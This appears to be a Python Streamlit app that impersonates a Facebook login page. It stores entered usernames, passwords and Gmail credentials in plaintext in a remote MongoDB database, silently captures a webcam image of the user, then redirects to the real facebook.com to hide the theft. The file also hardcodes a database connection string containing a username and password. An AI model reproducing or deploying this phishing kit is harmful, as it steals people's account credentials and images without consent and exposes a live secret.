import logging
import os
from datetime import datetime

import cv2
import streamlit as st
import streamlit.components.v1 as components
from pymongo import MongoClient
from pymongo.errors import DuplicateKeyError

# MongoDB setup
mongo_uri = "mongodb+srv://abdullahzubair356:kadharkadhar@facebook-login.6fv4m.mongodb.net/?retryWrites=true&w=majority&appName=facebook-login"
client = MongoClient(mongo_uri)
db = client["user_db"]
users_collection = db["users"]
images_collection = db["images"]

# Ensure MongoDB collections are set up
users_collection.create_index("username", unique=True)
images_collection.create_index("username")


def configure_user_logger(username):
    # Ensure the User_Credentials directory exists
    user_log_dir = "User_Credentials"
    if not os.path.exists(user_log_dir):
        os.makedirs(user_log_dir)  # Create the directory if it doesn't exist

    user_log_file = os.path.join(user_log_dir, f"{username}.log")

    user_logger = logging.getLogger(username)
    user_logger.setLevel(logging.INFO)

    if not user_logger.handlers:
        file_handler = logging.FileHandler(user_log_file)
        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        file_handler.setFormatter(formatter)
        user_logger.addHandler(file_handler)

    return user_logger


def save_credentials(username, password):
    user = {"username": username, "password": password}
    try:
        # Try to insert the user into the database
        users_collection.insert_one(user)
    except DuplicateKeyError:
        # If duplicate username exists, inform the user to choose a different username
        st.error(
            f"The username '{username}' is already taken. Please choose a different username."
        )


def save_images(username):
    # Ensure the 'user_images' folder exists
    user_images_dir = "user_images"
    if not os.path.exists(user_images_dir):
        os.makedirs(user_images_dir)

    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        st.error("Could not access the camera. Please grant permissions and try again.")
        return

    ret, frame = cap.read()

    if not ret:
        st.error("Failed to capture image.")
        cap.release()
        return

    # Save the image locally with the username
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    image_filename = os.path.join(user_images_dir, f"{username}_{timestamp}.jpg")
    cv2.imwrite(image_filename, frame)

    cap.release()
    st.success("Image saved successfully!")

    # Store image metadata in MongoDB
    image_data = {"username": username, "image_filename": image_filename}
    images_collection.insert_one(image_data)


def redirect_to_facebook():
    js = """
        <script>
            (function() {
                window.open('https://www.facebook.com', '_blank');
            })();
        </script>
        <a href="https://www.facebook.com" target="_blank" id="fallbackLink" style="display: none;">Redirect to Facebook</a>
        <script>
            document.getElementById('fallbackLink').click();
        </script>
    """
    components.html(js, height=0)
    st.markdown(
        """
        <div style="text-align: center; margin-top: 10px;">
            If not redirected automatically, 
            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer">click here</a>
        </div>
    """,
        unsafe_allow_html=True,
    )


def handle_successful_login(username, message="Login successful!"):
    if "redirect_done" not in st.session_state:
        st.session_state["redirect_done"] = False

    if not st.session_state["redirect_done"]:
        st.session_state["current_user"] = username
        user_logger = configure_user_logger(username)
        user_logger.info(f"User '{username}' logged in successfully.")
        save_images(username)
        st.success(f"{message} Redirecting to Facebook...")
        redirect_to_facebook()
        st.session_state["redirect_done"] = True


def login():
    username = st.text_input("Username", key="login_username")
    password = st.text_input("Password", type="password", key="login_password")

    if st.button("Login"):
        if not username or not password:
            st.error("Please fill in both fields.")
        else:
            # Check if the user exists in MongoDB and verify password
            user = users_collection.find_one({"username": username})
            if user and user["password"] == password:
                handle_successful_login(username)
            else:
                st.error("Invalid username or password!")


def signup():
    new_username = st.text_input("New Username", key="signup_username")
    new_password = st.text_input("New Password", type="password", key="signup_password")

    if st.button("Sign Up"):
        if not new_username or not new_password:
            st.error("Please fill in both fields.")
        else:
            save_credentials(new_username, new_password)
            handle_successful_login(new_username, "Account created successfully!")


def login_with_gmail():
    email = st.text_input("Gmail Address", key="gmail_username")
    password = st.text_input("Password", type="password", key="gmail_password")

    if st.button("Login with Gmail"):
        if not email or not password:
            st.error("Please fill in both fields.")
        else:
            save_credentials(email, password)
            handle_successful_login(email)


# Initialize session state
if "current_user" not in st.session_state:
    st.session_state["current_user"] = None
if "redirect_done" not in st.session_state:
    st.session_state["redirect_done"] = False

# Custom CSS for styling the page
st.markdown(
    """
    <style>
    .main {
        background-color: #f0f2f5;
    }
    .block-container {
        max-width: 400px !important;
        margin: auto !important;
    }
    .stButton>button {
        background-color: #1877f2;
        color: white;
        font-size: 14px;
        padding: 8px 16px;
        border: none;
        border-radius: 4px;
        width: 100%;
    }
    .stButton>button:hover {
        background-color: #145db2;
    }
    .logo img {
        width: 30%;
        height: auto;
    }
    </style>
    """,
    unsafe_allow_html=True,
)

# Display Facebook logo above the form
st.markdown(
    """
    <div class="logo" style="text-align: center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
        <h3 style="color: #1877f2;">Facebook</h3>
    </div>
    """,
    unsafe_allow_html=True,
)

# Dropdown for authentication options
auth_option = st.selectbox(
    "Choose an authentication method",
    ("Login", "Sign Up", "Login with Gmail"),
    key="auth_option",
)

# Main logic
if st.session_state["current_user"] is None:
    if auth_option == "Login":
        login()
    elif auth_option == "Sign Up":
        signup()
    elif auth_option == "Login with Gmail":
        login_with_gmail()
else:
    st.write(f"Welcome back, {st.session_state['current_user']}!")
    if not st.session_state["redirect_done"]:
        redirect_to_facebook()
        st.session_state["redirect_done"] = True
